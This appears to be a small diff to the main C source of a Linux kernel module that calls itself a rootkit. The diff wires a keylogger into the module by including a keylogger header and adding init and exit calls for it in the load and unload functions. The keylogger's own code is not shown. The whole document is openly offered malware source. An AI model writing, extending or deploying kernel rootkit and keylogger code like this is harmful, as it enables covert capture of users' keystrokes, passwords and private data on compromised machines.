@@ -4,6 +4,7 @@
 #include <linux/fs.h>
 #include "simple_rootkit.h"
 #include "fops.h"
+#include "keylogger.h"
 
 MODULE_LICENSE(DRIVER_LICENSE);
 MODULE_AUTHOR(DRIVER_AUTHOR);
@@ -12,13 +13,15 @@ MODULE_DESCRIPTION(DRIVER_DESC);
 static int __init rootkit_init(void) {
 	printk(KERN_INFO "[+] Module loaded, inside %s.\n", __FUNCTION__);
 	init_fops();
+	init_keylogger();
 	return 0;
 }
 
 static void __exit rootkit_exit(void) {
-	 printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
-	 exit_fops();
-	 return;
+	printk(KERN_INFO "[-] Module unloaded, inside %s.\n", __FUNCTION__);
+	exit_fops();
+	exit_keylogger();
+	return;
 }
 
 module_init(rootkit_init);
